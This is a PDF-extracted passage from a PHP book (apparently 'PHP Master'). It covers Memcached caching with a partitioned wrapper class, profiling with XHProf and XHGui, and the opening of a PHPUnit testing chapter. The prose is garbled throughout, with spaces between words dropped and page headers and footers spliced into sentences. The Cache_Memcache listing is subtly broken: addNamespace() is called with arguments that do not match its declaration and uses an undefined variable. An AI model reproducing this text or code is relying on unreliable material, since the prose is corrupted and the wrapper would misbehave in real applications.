That code might beasingle SQL query (forexample, using theMySQL query cache),
anAPIrequest, asection ofapage (such asanews feed), oranentire page.
There arethree things youmust decide when caching:
1.What areyougoing tocache?
2.How long will youcache itfor?
3.Where areyougoing tostore it?217 Performance
www.it-ebooks.info
Theanswers tothese three questions istricky .Ideally ,thegreater part ofyour site
will becacheable forlong periods oftime; unfortunately ,thisisrarely thecase.
Themechanism forcaching isalways going tobethesame:
1.Create aunique identifier foraspecific piece ofcontent. This should bereprodu-
cible forthesame piece ofcontent every time (don’t useanitem likeatimestamp!).
2.Check toseeifsomething with theidentifier exists inthecache.
3.Ifitexists, retrieve it.
4.Ifitdoesn’t exist, generate itandstore it.
5.Return thedata.
Disk Cache
While wealready know disk storage sucks, it’sstillfaster than generating complex
data. Itsbiggest issue isscaling—unless you’re going tospend thousands onaSAN
(storage area network), you’re stuck with lessreliable network storage likeNetwork
FileSystem (NFS),3Gluster ,4andSamba.5
APC
APC hastheability tostore user data, (and notjustyour opcodes) usingapc_store() ,
apc_exists() andapc_fetch() .APC storage issuper fast, butit’sconfined toa
single machine.
Memcached
Memcached isbuilt forcaching. Initially built tocache MySQL queries, it’sasimple
key-value pairthatworks well forcaching almost anything. Memcached uses memory
forcaching, andyoucansettimeouts, orjustletthememory fillupandpush out
theoldest items, orboth.
Itcanbepooled across multiple machines with ease, andisfast. Memcached isa
great solution formost caching storage, butithasafewcaveats:
3http://www .freebsd.org/doc/handbook/network-nfs.html
4http://www .gluster .org/
5http://www .samba.org/samba/what_is_samba.htmlPHP Master: W rite Cutting-edge Code 218
www.it-ebooks.info
■Itcanbecome CPU-bound; atthispoint, adding more nodes with more memory
isalosing proposition, causing slowdowns.
■Ithasa1MB value limit. Theonly way tochange thisistomodify thesource
andrecompile. Ifyouarecaching larger objects, thisbecomes anissue.
Let’stake alook atamemcached implementation which resolves our1MB limit, as
well asallowing ustoeasily split ourcache into segmented partitions thatcanbe
cleared independently .
This simple idea uses partitions. Partitions areprefixes forthespecified key—they
contain thename ofthepartition, andanumber toindicate therevision ofthepar-
tition. Wealsostore another keythatmaintains thecurrent revision ofthepartition.
So,ifwehave apartition forstoring SQL queries—called sql—with acurrent revi-
sion of1,andweusetheSHA1 sum ofaquery asitskey,wemight seeakeythat
looks like:
sql_1_dabb46bddd6dd1dba1aadd8ac003bc17b7e9e0fb
Toclear thepartition cache, wesimply increment therevision by1.Now thenext
time wecheck andcache thesame query ,thekeywill be:
sql_2_dabb46bddd6dd1dba1aadd8ac003bc17b7e9e0fb
This means youwill nolonger getacache hitforthepreviously cached version,
and, asit’snolonger being hit,thevalue will quickly drop outofthecache. Addi-
tionally ,thewrapper will check toseeifavalue ismore than 1MB, andsplit it
across multiple values. Byalsostoring ametadata keywith theitem, wecanrecord
thenumber ofslabs used.
Finally ,bymaking thatmetadata aJSON data structure, wecanaddother information
likealastmodified date (thestorage date) andutilize thattoautomatically send
Last-Modified headers. Wecould alsosend anExpires header; however ,since we
don’t always know how long anitem will becached for(forexample, it’supdated
every time thedata ischanged), we’ve omitted this.
Sowhat does thismagical code look like?219 Performance
www.it-ebooks.info
chapter_06/cache.php
require_once 'Cache/Memcache.php';
// Instantiate our Cache
$cache = new Cache_Memcache();
// Use the REQUEST_URI as a key
$key = $_SERVER['REQUEST_URI'];
// Try to get our data
$data = $cache->get($key, 'blog-pages');
// If the data is not false, we got something valid
if ($data !== false) {
  echo $data;
} else {
  // Generate data, you can do this with buffering:
  // Start the buffer
  ob_start();
  // output all the data to the buffer
  
  ⋮
  // Retrieve and output the data at the same time
  $data = ob_get_flush();
  
  // Add it to the cache.
  $cache->set($key, $data, 'blog-pages');
}
This super -simple code letsuscache ourblog pages intheblog-pages partition,
where each page would becached onfirst request. Additionally ,wemight have a
blog-settings partition, forum-posts partition, andsoon.Wecaneasily clear the
blog-pages partition when weupdate ourblog template bycalling:
require_once 'Cache/Memcache.php';
// Instantiate our Cache
$cache = new Cache_Memcache();
// Clear the cache
$cache->clearCache('blog-pages');
YoucanseetheCache_Memcache class infullbelow .ThekeytoourCache_Memcache
class istheaddNamespace() method; thiswill create thenamespace keyifnonePHP Master: W rite Cutting-edge Code 220
www.it-ebooks.info
exists, andthen return it.From thatpoint, anydata being stored inthatpartition
will have thekeyprepended bythenamespace andnamespace key.
Clearing thecache using theclearCache() method simply increments thatkey:
chapter_06/Memcache.php
/**
 * Memcache Wrapper
 */
/**
 * Memcache Wrapper
 *
 * Allows for partitioned cache
 * that can be cleared on a partition basis.
 * 
 * Uses keys that consist of a partition, followed
 * by the current namespace key, followed by the
 * cached items key e.g. sql_128_$sha1ofquery
 */
class Cache_Memcache {
  /**
   * @var bool Whether we are connected to at least one server ➥
        in the pool
   */
  protected $connected = false;
  /**
   * @var Memcache
   */
  protected $memcache = null;
  protected $pool = array(
      array('host' => 'localhost', 'port' => '11211', 'weight' ➥
              => 1),
          // Define other hosts here
  );
  /**
   * Constructor
   */
  public function __construct() {
    $this->connect();
  }221 Performance
www.it-ebooks.info
  public function isConnected() {
    return $this->connected;
  }
  /**
   * Connect to the memcached pool
   *
   * @return void
   */
  protected function connect() {
    $this->connected = false;
    $this->memcache = new Memcache();
    foreach ($this->pool as $host) {
      $this->memcache->addServer($host['host'], $host['port'], ➥
        true, $host['weight']);
      // Confirm that at least one server in the pool connected
      $stats = $this->memcache->getExtendedStats();
      if ($this->connected || ($stats["{$host['host']}: ➥
           {$host['port']}"] !== false && sizeof($stats["{$host ➥
             ['host']}:{$host['port']}"]) > 0)) {
        $this->connected = true;
      }
    }
    return $this->connected;
  }
  /**
   * Returns the namespace value for the current partition
   * 
   * This method will create a new namespace key for the current ➥
       partition.
   * 
   * To clear the cache for a specific partition of the cache, ➥
       just increment
   * this key.
   *
   * @param string $key
   * @return string
   */
  protected function addNamespace($partition = '') {
    // If we're not connected, just return false
    if (!$this->connected) {PHP Master: W rite Cutting-edge Code 222
www.it-ebooks.info
      return false;
    }
    // Get the current namespace key
    $ns_key = $this->memcache->get($partition);
    if ($ns_key == false) {
      // No key currently set, set one at random
      $ns_key = rand(1, 10000);
      $result = $this->memcache->set($partition, $ns_key, 0, 0);
    }
    // Return the key with the naamespace key
    $my_key = $partition . "_" . $ns_key . "_" . $key;
    return $my_key;
  }
  /**
   * Clears the cache by incrementing the namespace key
   *
   * @return void
   */
  public function clearCache($partition = '') {
    if (!$this->connected) {
      return false;
    }
    // Memcache has a built in increment method
    $this->memcache->increment($partition);
  }
  /**
   * Add a value to the cache
   * 
   * Will also add a metadata key
   * with modified date and split
   * large values (>=1MB) across
   * multiple keys automatically.
   *
   * @param string $key
   * @param string $value
   * @param int $expires
   * @return boolean
   */
  public function set($key, $value, $partition = '', ➥223 Performance
www.it-ebooks.info
    $expires = 14400) {
    // Define a constant so we don't have a magic number
    define('ONE_MB', 1 * 1024 * 1024);
    if (!$this->connected) {
      return false;
    } elseif (strlen($value) >= ONE_MB) {
      // Value is more than 1MB, split it
      $value = str_split($value, ONE_MB);
    }
    // Set an expiration of now plus timeout
    if ($expires !== 0) {
      $expires += time();
    }
    // Add the partion and namespace key to our item key
    $ns_key = $this->addNameSpace($key, $partition);
    $this->memcache->set($ns_key . '_metadata', json_encode ➥
      ((object) array("modified" => gmdate('D, d M Y H:i:s') . ➥
        ' GMT', 'slabs' => sizeof($value))), ➥
         MEMCACHE_COMPRESSED, $expires);
    // If our value is split, we need to store it in ➥
         multiple keys
    if (is_array($value)) {
      foreach ($value as $k => $v) {
        // Add an incrementing number to the key and store ➥
             the chunk
        $this->memcache->set($ns_key . '_' . $k, $v, ➥
           MEMCACHE_COMPRESSED, $expires);
      }
      return true;
    }
    return $this->memcache->set($ns_key, $value, ➥
      MEMCACHE_COMPRESSED, $expires);
  }
  /**
   * Returns the data for a given key. 
   * 
   * Returns false if no data exists.
   * PHP Master: W rite Cutting-edge Code 224
www.it-ebooks.info
   * Automatically fetches the metadata key
   * and sends the Last-Modified header.
   * 
   * Automatically retrieves large values split
   * across multiple slabs.
   * 
   * Also sends an X-Cache-Hit header to indicate
   * if the item was found in the cache.
   *
   * @param string $key
   * @return string
   */
  public function get($key, $partition = '') {
    if (!$this->connected) {
      return false;
    }
    $ns_key = $this->addNameSpace($key, $partition);
    $meta = $this->memcache->get($ns_key . '_metadata');
    // Send appropriate headers
    if ($meta && !empty($meta) && !headers_sent()) {
      $meta = json_decode($meta);
      header("X-Cache-Hit: 1", false);
      if (isset($meta->modified)) {
        header('Last-Modified: ' . $meta->modified);
      }
    } elseif (!$meta && !headers_sent()) {
      header("X-Cache-Hit: 0", false);
      return false;
    }
    // Retrieve data split across multiple keys
    $value = '';
    if ($meta && isset($meta->slabs) && $meta->slabs > 1) {
      // Item is split across keys
      for ($i = 0; $i < $meta->slabs; $i++) {
        // Concat each key to the previously returned data
        $value .= $this->memcache->get($ns_key . '_' . $i);
      }
    } else {
      // Item is not split
      $value = $this->memcache->get($ns_key);
    }225 Performance
www.it-ebooks.info
    return $value;
  }
  /**
   * Deletes the data for a given key.
   * 
   * Returns true on successful deletion, false if unsuccessful.
   *
   * @param string $key
   * @return boolean
   */
  public function delete($key, $partition = '') {
    if (!$this->connected) {
      return false;
    }
    return $this->memcache->delete($this->addNamespace($key, ➥
      $partition));
  }
}
Therule ofthumb forcaches istofigure outthemaximum possible time data can
liveinthecache, andtrytomake sure itdoes. Bypartitioning ourcache, wecan
clear itforsections ofourapplication cache quickly ,easily ,andwithout affecting
other items init.
Depending onyour needs, alagtime between data being modified anddata being
invalidated inthecache may beacceptable; inthiscase, simple timeouts (say,five
minutes) may suffice.
Generally ,it’spreferable tosetthecache toaninfinite timeout andthen only clear
itonwrites. This ensures thatanitem iscached foraslong asispossible, butisalso
immediately updated.
Profiling
ProfilingSo you’ve done allthecaching andquery optimizations, andremoved all
thesystem bottlenecks, butyour code isstillrunning tooslow .Now youhave to
face themusic andadmit that, actually ,your code isn’t perfect andcould beim-PHP Master: W rite Cutting-edge Code 226
www.it-ebooks.info
proved. Butyoualready didthebest youcould …so,now what? This iswhere
profiling comes in.
istheactoftaking accurate time and/or memory measurements forevery action
your code performs. This isthen explored todetermine where thebottlenecks lie.
There aretwotools forprofiling thatarecommonly used:
1.Thetried-and-tested Xdebug6extension written byDerick Rethans, with
KCachegrind7orQCachegrind8toreview theresults.
2.Newcomer XHProf9,from thefolks atFacebook, with theXHGui web front end
written byPaul Reinheimer .
Xdebug isafantastic toolthatprovides themost insight into your code. Itdoes,
however ,come with toomuch overhead, soistypically bestavoided inaproduction
environment; furthermore, KCachegrind/QCachegrind work poorly onMac OSX
orWindows. There’ saweb front endcalled webcachegrind, butitfails toprovide
anywhere near thefunctionality ofthedesktop tools, norXHGui. Additionally ,
comparing twounique profiles canbeatricky task.
Ontheother hand, XHProf isatooldeveloped foruseinproduction environments.
Facebook hasnoted thatitprofiles hitsrandomly inproduction toassess performance
onanongoing basis. Withtheaddition ofXHGui, youcanvery easily compare
multiple runs, even several months apart.
Installing XHPr of
XHProf isavailable asaPECL extension; however ,thelatest package (atleast) won’t
install with thestandard pecl install xhprof .Instead, wecaninstall itbyhand.
First, fetch thepackage (you candownload thisinyour browser ,too,ifyou’d like!)
andunpack it:
6http://xdebug.org/
7http://kcachegrind.sourceforge.net/html/Home.html
8http://kcachegrind.sourceforge.net/html/Home.html
9http://pecl.php.net/package/xhprof227 Performance
www.it-ebooks.info
$ wget http://pecl.php.net/get/xhprof-0.9.2.tgz
$ tar –zxvf xhprof-0.9.2.tgz
Next, change totheextension subdirectory; thisiswhere we’ll compile theexten-
sion:
$ cd xhprof-0.9.2/extension
Tocompile ashared extension (either onethat’sincluded with themain PHP distri-
bution oronefrom PECL), youmust first runthephpize command. This setsup
theextension forcompilation against your current PHP version.
Then you’ll run./configure ,make ,andmake install ,justlikewith anynormal
source compilation:
$ ./configure --enable-xhprof
$ make
$ make install
Now enable theextension inyour php.ini file:
[xhprof]
extension=xhprof.so
xhprof.output_dir="/tmp/xhprof"
Once thisisdone, you’ll want torestart your web server .
Now thatwehave theextension installed, let’suseit.Forthis, wereturn tothe
unpacked code directory ,andthistime pull outthexhprof_html andxhprof_lib
directories. Move both directories toyourDocumentRoot .
Next, weneed tocreate twofiles towrap ourcode. We’llusePHP’ sauto_pre-
pend_file andauto_append_file toautomatically wrap ourcode with these files.
Thefirst filewe’ll call header .php:PHP Master: W rite Cutting-edge Code 228
www.it-ebooks.info
chapter_06/header .php
// Only run if the xhprof extension is enabled
if (extension_loaded('xhprof')) {
  // Include the xhprof classes
  include_once '/path/to/xhprof_lib/utils/xhprof_lib.php';
  include_once '/path/to/xhprof_lib/utils/xhprof_runs.php';
  // Start the profiler capturing CPU and Memory data.
  xhprof_enable(XHPROF_FLAGS_CPU + XHPROF_FLAGS_MEMORY);
}
We’llcallthesecond filefooter .php:
chapter_06/footer .php
if (extension_loaded('xhprof')) {
  $ns = 'myapp';  // namespace for your application
  // Turn off the profiler
  $xhprof_data = xhprof_disable();
  // Instantiate the class to save our run
  $xhprof_runs = new XHProfRuns_Default();
  // Save the run
  $run_id = $xhprof_runs->save_run($xhprof_data, $ns);
  // url to the XHProf UI libraries 
  $url = 'http://example.org/xhprof_html/index.php';
  $url .= '?run=%s&source=%s';
  // Replace the placeholders
  $url = sprintf($url, $run_id, $ns);
  // Display the URL
  echo "<a href='$url' target='_new'>Profiler Output</a>";
}
Finally ,addthefollowing toyour php.ini :
auto_prepend_file = /path/to/xhprof_lib/header.php
auto_append_file = /path/to/xhprof_lib/footer.php
Or,addthistoyour .htaccess file:229 Performance
www.it-ebooks.info
php_value auto_prepend_file /path/to/xhprof_lib/header.php
php_value auto_append_file /path/to/xhrprof_lib/footer.php
Once you’ve done this(and ifnecessary ,restarted your web server), you’ll seea
link atthebottom ofevery page tothexhprof.profile output. Clicking thislink
will reveal apage similar toFigure 6.10.
Figur e 6.10. The XHPr of user interface
This page gives anoverview oftheprofile, including theamount ofwall time (actual
time) andmemory usage, aswell asthetotal number offunctions called. This is
followed byalistofthetop100function calls; bydefault, they’re intheorder they
arecalled.
Each rowincludes thefollowing:
■Function Name :thename ofthefunction
■Calls:how many times thefunction wascalled
■Incl. W all Time:theamount ofwall time thatpassed from when thefunction was
called towhen itcompleted, including anysubfunctions called
■Excl. W all Time:thewall time used, excluding subfunctions
■Incl. CPU :theamount ofCPU time used, including anysubfunctions calledPHP Master: W rite Cutting-edge Code 230
www.it-ebooks.info
■Excl. CPU :theamount ofCPU time used, excluding subfunctions
■Incl. MemUse :theamount ofmemory used, including anysubfunctions called
■Excl. MemUse :theamount ofmemory used, excluding subfunctions
■Incl. PeakMemUse :thepeak amount ofmemory used during theexecution ofthe
function
■Excl. PeakMemUse :thepeak amount ofmemory used, excluding subfunctions
Youcanchange theordering byclicking onthecolumn headers; forexample, to
find theslowest function (without including subfunction calls) click ontheExcl.
Wall Time (microsec) column header .
Clicking onafunction callwill give youthecallstack forthatfunction call—this
tells youwhat called thefunction, andwhat itcalled directly (that is,nograndchild
function calls), andprovides allthesame metrics asthelistabove. This allows you
toexamine why afunction istaking aslong asitis,andtoseewhat makes upthe
difference between inclusive andexclusive metrics. Takealook atFigure 6.11.
Figur e 6.11. This r eport gives us a list of par ent/childr en calls
Ifyouwish toseethisinagraphical format, click ontheView Callgraph link, which
will render along thelines ofFigure 6.12.231 Performance
www.it-ebooks.info
Figur e 6.12. Drupal’ s callgr aph, highlighting the slowest sections
Thegraph highlights theslowest sections inthelarge boxatthetopoftheimage.
Another great feature available istheability tocompare runs. Todothis, simply
change theURL toinclude arun1 andrun2 argument:
http://example.org/xhprof_html/index.php?run1=4e6d84dfc53d8& ➥
  run2=4e6d88603003d&source=myapp 
Inaddition tothedefault UIthatships with XHProf, there’ sanother toolthatattempts
toimprove upon it,giving anicer interface andeasier access tometrics. While the
XHGui project isstillinitsinfancy ,itcanalready provide some great information.
Installing XHGui
XHGui isavailable from GitHub—simply check itout,andplace itsomewhere ap-
propriate tobeincluded aspart ofyour project (more onthisbelow):
$ git clone git://github.com/preinheimer/xhprof.git
Once youhave thiscloned, you’ll need tosetuptheDBadapter ,unless you’re using
MySQLi. This isdone byeither symlinking (onUnix-like operating systems) or
moving thefile(Windows). We’llbeusing MySQLi forourexamples:PHP Master: W rite Cutting-edge Code 232
www.it-ebooks.info
$ cd xhprof/xhprof_lib/utils
$ rm xhprof_runs.php
$ ln –s xhprof_runs_mysql.php xhprof_runs.php
Now create adatabase andinstall thedefault schema:
CREATE TABLE `details` (
  `id` char(17) NOT NULL,
  `url` varchar(255) default NULL,
  `c_url` varchar(255) default NULL,
  `timestamp` timestamp NOT NULL default CURRENT_TIMESTAMP on ➥
     update CURRENT_TIMESTAMP,
  `server name` varchar(64) default NULL,
  `perfdata` MEDIUMBLOB,
  `type` tinyint(4) default NULL,
  `cookie` BLOB,
  `post` BLOB,
  `get` BLOB,
  `pmu` int(11) default NULL,
  `wt` int(11) default NULL,
  `cpu` int(11) default NULL,
  `server_id` char(3) NOT NULL default 't11',
  `aggregateCalls_include` varchar(255) DEFAULT NULL,
  PRIMARY KEY  (`id`),
  KEY `url` (`url`),
  KEY `c_url` (`c_url`),
  KEY `cpu` (`cpu`),
  KEY `wt` (`wt`),
  KEY `pmu` (`pmu`),
  KEY `timestamp` (`timestamp`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
Next, weneed tosetupourdatabase credentials:
$ cd .. # back up to xhprof_lib
$ cp config.sample.php config.php
Edit thenew config.php filename, andinput allthesettings indicated:
// Change these:
$_xhprof['dbhost'] = 'localhost';
$_xhprof['dbuser'] = 'username';
$_xhprof['dbpass'] = 'password';233 Performance
www.it-ebooks.info
$_xhprof['dbname'] = 'xhprof';
$_xhprof['servername'] = 'myserver';
$_xhprof['namespace'] = 'myapp';
$_xhprof['url'] = 'http://url/to/xhprof/xhprof_html';
Thelastthree variables setaname forthespecific server onwhich theprofiling is
done. Thefirst allows youtoidentify single machines inacluster; thenext isa
namespace foraspecific application, allowing youtoprofile multiple applications
within oneXHGui installation; andthelastsetting istheURL toaVirtualHost,
whoseDocumentRoot issettothexhprof_html directory inourXHGui source folder:
<VirtualHost *:80>
        ServerName xhprof.local
        DocumentRoot /path/to/xhprof/xhprof_html
</VirtualHost>
Once youhave setuptheVirtualHost, youcanthen testthesetup byvisiting the
site. Itshould look asinFigure 6.13.
Figur e 6.13. The XHGui interface is a fairly str aightforwar d layout
While thisinterface issimplistic, there islotsoffunctionality available here. Along
thetopistheability tofilter byserver (this iswhere theservername configuration
option comes into play), bydomain name (soyoucanseerequests forthesame
domain even across multiple servers), andtosearch forrequests.
Below that, youcanchange thenumber ofruns yousee;observe which URLs have
hadthemost requests, used themost CPU andRAM, ortaken thelongest onthe
current day; ormonitor activity inthelastseven days.
Now thatwehave XHProf working, let’sputittowork. XHGui again uses the
auto_prepend_file andauto_append_file settings towrap your requests incode,
which turns ontheprofiling andstores itinthedatabase forlater retrieval viathePHP Master: W rite Cutting-edge Code 234
www.it-ebooks.info
XHGui interface. Itisrecommended toaddthistotheVirtualHost ofthesiteyou
wish toprofile:
<VirtualHost *:80>
  ServerName drupal.local
  DocumentRoot /Library/WebServer/Documents/drupal
  php_admin_value auto_prepend_file /path/to/xhprof/external/ ➥
    header.php
  php_admin_value auto_append_file /path/to/xhprof/external/ ➥
    footer.php
</VirtualHost>
Toinitiate your firstprofile run, append_profile=1 totheURL youwish toprofile.
Doing sowill setacookie andforward youtotherequested page. Thecookie will
persist until youpass_profile=0 instead.
Todemonstrate, we’ll profile afresh install ofDrupal. This gives usasufficiently
complex system onwhich toreview ourfindings, andonewhose performance
profile will besimilar toagood proportion ofprofiles you’ll see.
Choosing toprofile themain page willaddasingle profile runtotheXHGui database,
asshown inFigure 6.14.
Figur e 6.14. Adding a single pr ofile to the XHGui database
Each runshows thetime itwasexecuted, alongside akeyused forcomparisons
(more onthatlater), theoverall CPUtime, Wall Time(therealpassage oftime; that
is,thetime thatwould have passed were youcounting theseconds using aclock
onthewall), Peak Memor y Usage ,andtwoURLs—the actual URL,aswell asthe
Simplified URL .
XHGui allows youtodefine a“urlSimilartor ,”afunction thatcanconsolidate URLs
thatusethesame code with different arguments. Forexample: /edit.php?id=1 and
/edit.php?id=2 areprobably calling thesame code; byunderstanding theidisa235 Performance
www.it-ebooks.info
variable, wecancompare tworuns against distinct data more easily .This “similar”
URL isshow intheSimplified URL column.
Most ofXHGui isgeared towards tocomparing multiple runs, asprofiling informa-
tionismore useful intheaggregate, especially when trying toactually measure how
changes affect performance over time.
Clicking ontheTimestamp will take youthrough thefullprofile forthatsingle run.
Thefirst chunk ofdata here isgiven over toaggregate data forboth theexact URL
andthesimilar URL (inourcase, they’re thesame aswehave nourlSimilartor set
up). Theresult isillustrated inFigure 6.15.
Figur e 6.15. The full pr ofile for a single run as shown by the Timestamp  link
Atthebottom ofthistable isaninput foranother runkeyagainst which tocompare
thecurrent one(we’ll look atthislater).
Thenext section oftheinterface isallabout ourrequest, thecookies andtheir values,
theGET(and ifapplicable, POST )arguments, andasimple piechart; thelatter provides
uswith abroad overview ofwhat time wasspent running which functions, asshown
inFigure 6.16.PHP Master: W rite Cutting-edge Code 236
www.it-ebooks.info
Figur e 6.16. Results fr om the r equest, including cookies, GET and POST  arguments
You’ll notice thatthenumber oneitem inthepiechart isLoading .This isaspecial
group thatencompasses include ,include_once ,require ,andrequire_once .Be-
cause thisiseffectively disk I/O,wecanseethatbysimply turning onourbytecode
cache wecanpotentially improve ourperformance significantly .We’lltrythisfirst.
Below thisisthefinal section, illustrated inFigure 6.17.
Figur e 6.17. The list of function calls performed
Here wecanseealistofthefunction calls performed during therequest. Each row
contains thefollowing (you’ll recognize these asfriendly alternatives tothestandard
UI):237 Performance
www.it-ebooks.info
This listissortable byanycolumn; it’sagood idea toquickly check theCall Count
column, incase you’re accidentally calling anelement many more times than ex-
pected. Forexample, weonce found outwewere checking forPOST input during
thesave ofdata being introduced viaCSV import; itwascalling ourinput test
functions almost 30,000 times.
Clicking onanyofthefunction names takes youtothefunction Parent/Child Call
Report forthatfunction, justlikeinthestandard UI.
Now thatwe’ve seen themain parts ofXHGui, let’strytoimprove ourspeed by
enabling theAPC cache, andseewhat XHGui canshow us.This canbeperformed
with either GUI; however ,foritsease ofuse,we’ll gowith XHGui, despite itsinfancy .
Ifwelook again atourlistofruns, weseeouroriginal request atthebottom; the
next request isthefirst request with APC enabled; thetopmost isthefirst request
after APC hascached theopcodes.
Theamount ofresources used byAPC toperform theinitial cache isquite significant,
using almost 35% more CPU time andtaking atleast fivetimes longer bythewall
clock. However ,once therequest iscached, theimpact oftheAPC isimmediately
seen—CPU usage isdown bytwo-thirds andwall time ismore than halved, asseen
inFigure 6.18.
Figur e 6.18. The impact of the APC once a r equest is cached
Byclicking ontheURL orsimplified URL, wecanalso seethese onagraph, in
Figure 6.19.PHP Master: W rite Cutting-edge Code 238
www.it-ebooks.info
Figur e 6.19. W all time and peak memory usage r epresented gr aphically
So,now thatwehave ourthree runs, letscompare them. First, click through toour
original request (you’ll want todothisinanew tab,orcopy therequest IDsforthe
other requests toascratch padfirst).
Then, weplug thesecond request’ sIDintothePerform Delta input boxatthebottom
oftheaggregate information table. This brings ustotheDelta Review page. This page
hastwomajor components: thetoppart comprises therequest details forthefirst
andsecond runs oneither side oftheDelta Difference table. This table isthemost
informative part ofthepage. Theresults areshown inFigure 6.20.
Figur e 6.20. Differ ences between fir st and second runs tabulated239 Performance
www.it-ebooks.info
This section isfollowed bytheFunction Call list,which shows thedelta difference
between thetworuns foreach function. Inthiscase, theonly difference isthere-
source usage—the requests calltheexact same number offunction calls.
Now let’scompare ourfirst andthird requests. Takealook atFigure 6.21.
Figur e 6.21. Differ ences between our fir st and thir d runs
This time thenumber offunction calls hasdecreased, andthedifference isdramat-
ic—60% faster .Thedifference infunction calls isduetooptimizations made by
APC. So,ourresult iswhat weexpected; now let’sconfirm thereason. Simply click
through therundetails, asshown inFigure 6.22.
Figur e 6.22. A pie chart of our r equest details shows the dr amatic differ ence in function callsPHP Master: W rite Cutting-edge Code 240
www.it-ebooks.info
Notunsurprisingly ,Loading now occupies amuch smaller slice ofourpie.Perfect!
Obviously ,with astock Drupal install there’ slittle going on,sooptimizing beyond
thispoint would berather pointless; however ,now youcanseetheprocess ofde-
termining where theslowdowns areinyour code, andhow tomeasure changes.
Thebiggest keywhen trying tomake performance adjustments: change onething
atatime. Given how easy itistomeasure andcompare before andafter,there really
isnoexcuse forignoring thisrule!
Profiling with XHProf canbequite fun,andfinding andfixing bigperformance issues
isagreat experience. Additionally ,youcanreally getafeelforhow your application
runs—how much spaghetti isthere really? Profiling anddigging through theresults
isthemark ofagood developer ,anddoing itoften canputyoufirmly onthepath
tobeing agreat developer .
Summary
Youcantarget many parts ofanapplication forperformance issues. Inmost cases,
however ,you’ll find thatyou’ll spend more time performing onedatabase query
than executing hundreds oflines ofPHP code. Profiling willhelp guide you, directing
youtowhere youshould focus themajority ofyour efforts.
Bytackling thelargest performance slowdowns first, youstand togain better overall
improvement. IfanSQL query takes 10seconds andyouspeed itupby50%, you
have saved yourself fiveseconds; however ,ifaPHP function takes onesecond, and
youspend thesame amount oftime tosave thatsame 50%, you’ve only saved half
asecond. Unfortunately ,wecanonly dosomuch. Atsome point, youwill reach
theabsolute limits ofthehardware, andinourexperience it’smore likely tobedisk
ornetwork I/Othan CPU orRAM. That’ swhen youneed tostart scaling across
multiple machines.
PHP,with itsshared-nothing architecture (that is,nopersistence between requests
unless youactively create itusing sessions andsome sortofstorage) naturally scales
very well. Yetthetopic ofscaling isvery complex, andreally warrants abook of
itsown tocover itproperly .Still, with thelessons learned inthischapter ,you
should bewell onyour way tostreamlining theperformance ofyour applications.241 Performance
www.it-ebooks.info
www.it-ebooks.info
Chapter7
Automated T esting
Few useful web applications have atrivial design; most have asetof“moving parts”
thatareintegrated toform theendproduct. Asthefunctionality andfeatures ofa
product change, sodoes itsdefinition ofintended orcorrect behavior .Thepurpose
ofautomated testing istoassure thatanapplication’ sintended behavior andits
actual behavior areconsistent over itslifetime.
There areseveral types oftesting, each targeting aspecific aspect ofanapplication.
This chapter will introduce youtoeach type oftest, aswell asthesoftware and
processes needed toimplement them inyour own projects.
Unit T esting
Thefirst step intesting anapplication istoensure thatitsindividual components
behave correctly ,apractice called unit testing .Without unit tests, isolating the
cause ofincorrect behavior intheapplication asawhole canbesubstantially more
difficult.
Unit tests aretypically developed using aunit testing framework, which provides
theinfrastructure needed towrite andruntests, andtooutput theresults. Some of
www.it-ebooks.info
themore commonly used unit testing frameworks include PHPUnit,1SimpleT est,2
andPHPT .3
PHPUnit isthedefacto standard formost projects, andimplements many ofthe
same features andconcepts present inother frameworks; assuch, itwill beused
forunit testing examples fortheduration ofthischapter .Notallunit testing
frameworks require knowledge ofobject oriented programming, butmost do;
PHPUnit isnoexception. Ifyou’re yettobecome familiar with theconcepts behind
object oriented programming, head back toChapter 1tofamiliarize yourself.
Installing PHPUnit
Thepreferred method ofinstalling PHPUnit isusing thePEAR installer .Forinform-
ation oninstalling PEAR packages, seeAppendix A.Installation instructions for
thePHPUnit PEAR package canbefound athttp://pear .phpunit.de.4Both processes
arefairly well-documented, sothey’ll notbereiterated here. Fortherestofthis
section, we’ll assume youhave afunctioning PHPUnit installation, andthatyour
PEAR installation path ispresent inyour PHP include path.5
Writing T est Cases
Testcases areclasses thatcontain logic totestother classes. Inthecase ofPHPUnit,
testcase classes extend thePHPUnit_Framework_TestCase class orasubclass ofit.
Conventionally ,most projects include atests subdirectory within theroot project
directory .Iffilepaths within thisdirectory correspond directly tothose inthe
project’ smain source code directory ,itcanbeeasier tonavigate. Forexample, ifa
classVendor_Group_Class iscontained inthefilelib/V endor/Group/Class.php ,the
corresponding testclass might belocated attests/V endor/Group/ClassT est.php .Ideally ,
class naming should comply with PEAR naming conventions6—more onwhy later
inthechapter .
Here’ sanexample class thatrequires testing:
1http://phpunit.de
2http://www .simpletest.org/
3http://qa.php.net/write-test.php
4http://pear .phpunit.de
5http://php.net/manual/en/ini.core.php#ini.include-path
6http://pear .php.net/manual/en/standards.naming.phpPHP Master: W rite Cutting-edge Code 244
www.it-ebooks.info
chapter_07/lib/Calculator .php
class My_Calculator
{
  public function add($a, $b)
  {
    return $a + $b;
  }
}
Thecorresponding testcase might look likethis:
chapter_07/tests/CalculatorT est.php
class My_CalculatorTest extends PHPUnit_Framework_TestCase
{
  private $calculator;
  protected function setUp()
  {
    $this->calculator = new My_Calculator();
  }
  protected function tearDown()
  {
    unset($this->calculator);
  }
  public function testAddBothPositive()
  {
    $result = $this->calculator->add(3, 2);
    $this->assertEquals(5, $result);
  }
  public function testAddPositiveAndZero()
  {
    $result = $this->calculator->add(2, 0);
    $this->assertEquals(2, $result);
  }
  public function testAddPositiveAndNegative()
  {
    $result = $this->calculator->add(-1, 1);245 Automated T esting
www.it-ebooks.info
    $this->assertEquals(0, $result);
  }
}
Foreach method inthisclass thathasaname prefixed withtest ,PHPUnit will
perform thefollowing process:
1.Create aninstance ofthisclass.
2.Execute thesetUp() method toperform anynecessary initialization before running
thetest.
3.Execute therelevanttest() method toexecute theactual testing logic.
4.Execute thetearDown() method toperform anynecessary cleanup.
Note thatdeclaring thesetUp() andtearDown() methods inyour testcases isop-
tional, becausePHPUnit_Framework_TestCase defines empty methods thatareex-
ecuted ifyoudon’t override them.
Testing logic consists ofassertions ,checks against state toconfirm thatlogic being
tested hastheintended effect. Assertion methods inPHPUnit,7such astheprevious
assertEquals() method, areprovided byPHPUnit_Framework_Assert ,theparent
class ofPHPUnit_Framework_TestCase .
Theadvantage ofusing these specialized assertion methods over,forexample, PHP’ s
nativeassert() function8isthatthey provide more information when expected
